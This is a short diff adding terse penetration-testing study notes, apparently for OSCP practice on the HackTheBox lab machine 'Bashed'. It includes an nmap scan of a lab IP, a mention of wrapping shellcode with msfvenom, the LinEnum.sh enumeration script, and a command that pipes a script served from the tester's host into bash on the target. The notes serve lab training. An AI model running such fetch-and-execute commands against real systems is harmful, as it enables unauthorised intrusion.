@@ -35,3 +35,17 @@ we can create one by cat shellcode.bin | msfvenom -p - -f exe -a x64 --platform 
 
 we can open this up in x64dbg
 needs to be done in x64dbg file
+
+# oscp tj null list
+
+bashed
+
+`nmap -sC -sV -oA nmap/initial 10.10.10.65`
+
+based on httpd version you can decide on th elinux kernel
+
+you can execute the file by host ing it using smiple HHTPserver and then saying curl http://10.10.10.1/new | bash
+
+LInenum.sh
+
+
